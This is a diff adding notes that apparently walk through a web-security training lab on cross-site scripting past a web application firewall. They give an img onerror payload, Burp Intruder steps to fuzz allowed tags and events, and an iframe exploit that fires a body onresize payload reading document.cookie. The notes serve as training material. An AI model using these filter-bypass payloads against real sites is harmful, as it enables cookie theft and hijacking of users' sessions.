@@ -1,0 +1,23 @@
+// Inject in Comment input field
+<img src=1 onerror=alert(1)>
+
+•	Send the Search function request to Burp Intruder.
+•	In Burp Intruder, in the Positions tab, click "Clear §".
+•	In the request template, replace the value of the search term with: <>
+•	Create a payload position and the value of the search term should look like: <§§>
+•	Visit the XSS cheat sheet and click "copy tags to clipboard".
+•	In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list.
+•	Click "Start attack".
+•	When the attack completes, review the results. Note that all payloads caused an HTTP 400 response, except for the body payload, which caused a 200 response.
+•	Go back to the Positions tab in Burp Intruder.
+•	Replace your search term with: <body%20=1> (URL encoded)
+•	Place the cursor before the = character to create a payload position. The value of the search term should now look like: <body%20§§=1>
+•	Visit the XSS cheat sheet and click "copy events to clipboard".
+•	In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list.
+•	Click "Start attack".
+•	When the attack completes, review the results. Note that all payloads caused an HTTP 400 response, except for the onresize payload, which caused a 200 response.
+•	Therefore, search=<body onresize=alert(document.cookie)> will bypass the WAF.
+
+<iframe src="https://ac971f9f1e62d79280c3a777002a0064.web-security-academy.net/?search=<body onresize=alert(document.cookie)>" onload=this.style.width='100px'>
+
+	Need to use <iframe> to load the target page src equal to malicious XSS payload. So that we can resize the <iframe> onload to trigger the payload
